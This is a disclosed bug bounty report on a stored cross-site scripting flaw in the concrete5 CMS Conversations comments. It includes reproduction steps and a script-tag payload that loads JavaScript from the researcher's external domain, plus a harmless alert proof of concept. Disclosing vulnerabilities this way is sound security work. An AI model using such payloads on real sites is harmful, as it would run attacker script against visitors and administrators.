# Stored XSS in Conversations (both client and admin) when Active Conversation Editor is set to "Rich Text"

## Report Details
- **Report ID**: 616770
- **URL**: https://hackerone.com/reports/616770
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-06-17T01:04:07.395Z
- **Disclosed**: 2021-10-04T16:43:27.528Z

## Reporter
- **Username**: bl4de
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: concretecms

## Vulnerability Information
Hi concrete5 Team,

**Summary**

I've identified Stored XSS vulnerability in  concrete5 **Conversations** module, when Active Conversation Editor is set to "Rich Text". An attacker is able to input malicious JavaScript, which is run in both client (agains any site visitor) as well as against any user logged into admin panel and visiting Conversations->Messages screen.

Severity: **External Attack Vector**; Core CMS
 
Core Version - 8.5.2a1
Version Installed - 8.5.2a1
Database Version - 20190520171430

commit `aeaa924977ee87220b7f2d2dadc25d5a24b9e2a1`

There are also some crayons here and there :)

**Steps to reproduce**

(All steps were made in concrete5 with default Elemental theme)

- make sure that *Active Conversation Editor* in System & Settings->Conversations->Settings is set to *Rich Text*

- go to any blog entry which allows to add a comment

- in rich text editor, make sure you click "Source" button first. That will save HTML with `<script>` tag and JavaScript payload "as-is" in database

- put following payload in comment field:

`<script src="http://bl4de.tech/poc.js"></script>`

{F510304}

- post comment

- you will immediately notice the payload is executed

- you can verify this is Stored XSS opening the page in any other browser, as an anonymous or logged in user:

Chrome

{F510307}

Firefox

{F510308}

Also, the payload is not visible. Below is the difference in comment when `Source` button was on and off (with the same payload as provided above):

{F510305}


- verify that payload **is also executed in administration panel** by going to Conversations->Messages screen:


{F510306}

**Impact**

An attacker is able to execute malicious JavaScript against any user, in both client and backend of the concrete5 application.


**Testing environment**

- concrete 8.5.2a1, installed locally from branch `develop`
- PHP/7.1.23 (macOS)
- Apache/2.4.34 (macOS)
- MySQL Community Server 8.0.16 for macOS 10.14
- Chromium 77.0.3826.0
- Google Chrome 74.0.3729.169
- Firefox 67.0.2

Content of `http://bl4de.tech/poc.js` used in PoC as payload:

```
'use strict'
const msg = 'This file is loaded from bl4de.tech domain and executed in context of ' + document.domain;
console.log(msg)
window['alert'](msg)
```



Best Regards,

Rafal 'bl4de' Janicki

## Impact

An attacker is able to execute malicious JavaScript against any user, in both client and backend of application.

## Attachments
- 1.png
- 2.png
- 3.png
- 4.png
- 5.png
